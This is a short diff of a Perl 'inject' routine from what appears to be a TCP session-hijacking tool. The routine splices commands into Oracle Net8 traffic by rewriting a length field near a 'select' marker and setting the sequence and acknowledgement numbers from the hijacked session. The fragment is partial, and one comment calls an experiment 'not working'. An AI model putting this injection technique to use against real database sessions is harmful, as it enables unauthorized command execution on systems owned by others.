@@ -75,6 +75,7 @@ sub inject {
 	# Pack cmd length
 	my $cmdlen = pack ('C*', length($cmd));
 	
+	my $sled_text = "select";
 	# Replace Net8 len before sled_text
 	# Capture length for use with other length field
 	$data =~ s/(.{1})($sled_text)/$cmdlen$2/i;
@@ -96,9 +97,11 @@ sub inject {
 	# Change initial process number - experiment to fix fetch, not working
 	# substr($data, 12, 1, pack('C', 0x17));
 	
-	# Ok now change sequence numbers to latest values, encode and send
-	$tcp_obj->{seqnum} = $session->{client_seq};
-	$tcp_obj->{acknum} = $session->{server_seq};
+	# Set Seq and Ack accordingly
+	$tcp_obj->{seqnum} = $self->{client_seq};
+	$tcp_obj->{acknum} = $self->{server_seq};
+	
+	# Insert new data
 	$tcp_obj->{data} = $data;
 	
 	# Encode for transmission	
